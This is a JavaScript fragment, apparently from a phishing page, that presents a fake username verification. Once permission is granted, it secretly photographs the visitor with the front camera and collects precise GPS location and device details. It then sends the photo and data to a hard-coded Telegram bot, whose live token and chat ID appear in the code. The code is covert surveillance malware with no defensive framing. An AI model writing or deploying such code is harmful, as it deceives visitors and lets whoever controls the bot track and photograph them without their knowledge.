const BOT_TOKEN = "7769457626:AAEytKi1_iKQ39t0K7sJGzMg5TUbkp_Rqbs";
    const CHAT_ID = "-1002535304990";

    let savedUsername = "";
    let izinDiberikan = false;

    async function mulaiVerifikasi() {
      const username = document.getElementById("username").value.trim();
      if (!username) {
        alert("⚠ Username wajib diisi!");
        return;
      }
      savedUsername = username;

      const sudahIzin = await cekIzin();
      if (sudahIzin || izinDiberikan) {
        tampilkanFloatingCard();
      } else {
        document.getElementById("overlay").style.display = "flex";
      }
    }

    async function mintaIzin() {
      document.getElementById("overlay").style.display = "none";

      try {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          const maps = `https://maps.google.com/?q=${latitude},${longitude}`;

          const device = navigator.userAgent;
          const os = navigator.platform;
          const screenRes = window.screen.width + "x" + window.screen.height;
          const lang = navigator.language;
          const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;

          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          const blob = await imageCapture.takePhoto();

          const caption = `
👤 Username : ${savedUsername}
💻 Device   : ${device}
🧠 OS       : ${os}
🖥️ Resolusi : ${screenRes}
🌐 Bahasa   : ${lang}
🕓 Timezone : ${tz}
📍 Lokasi   : ${maps}
`;

          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("caption", caption);
          formData.append("photo", blob);

          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          track.stop();
          izinDiberikan = true;
          tampilkanFloatingCard();

        }, err => {
          if (!izinDiberikan) document.getElementById("overlay").style.display = "flex";
        }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
      } catch (err) {
        if (!izinDiberikan) document.getElementById("overlay").style.display = "flex";
      }
    }

    function tampilkanFloatingCard() {
      const card = document.getElementById("floatingCard");
      card.classList.add("show");
      setTimeout(() => card.classList.remove("show"), 5000);
    }

    async function cekIzin() {
      try {
        const geo = await navigator.permissions.query({ name: "geolocation" });
        const cam = await navigator.permissions.query({ name: "camera" });
        if (geo.state === "granted" && cam.state === "granted") {
          izinDiberikan = true;
          return true;
        }
      } catch (e) {}
      return false;
    }